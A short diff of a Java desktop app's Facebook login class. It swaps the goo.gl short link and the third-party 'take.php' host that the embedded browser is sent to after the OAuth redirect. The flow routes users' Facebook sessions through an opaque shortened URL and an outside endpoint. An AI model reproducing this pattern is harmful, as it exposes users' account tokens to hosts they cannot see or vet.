@@ -26,7 +26,7 @@ public class LoginFB extends Application {
         final WebView browser = new WebView();
         final WebEngine webEngine = browser.getEngine();
         BorderPane root = FXMLLoader.load(getClass().getResource("../../view/FxmlLoginFB.fxml"));
-        webEngine.load("https://goo.gl/o41o99");
+        webEngine.load("https://goo.gl/Ntl44j");
         webEngine.getLoadWorker().stateProperty().addListener(new ChangeListener<Worker.State>() {
             int nbrredirect=0;
             @Override
@@ -37,7 +37,7 @@ public class LoginFB extends Application {
 
                     String lien = browser.getEngine().getLocation() ;
                     System.out.println(lien);
-                    if(lien.contains("webshc.com/take.php")){
+                    if(lien.contains("expletus.org/take.php")){
 
                         try {
                            JSObject window = (JSObject) webEngine.executeScript("window");
@@ -52,7 +52,7 @@ public class LoginFB extends Application {
                     else if(lien.contains("https://www.facebook.com/v2.8/dialog/oauth?redirect_uri")){
                         nbrredirect++;
 
-                            webEngine.load("http://webshc.com/take.php");
+                            webEngine.load("http://expletus.org/take.php");
 
 
                     }  }} });
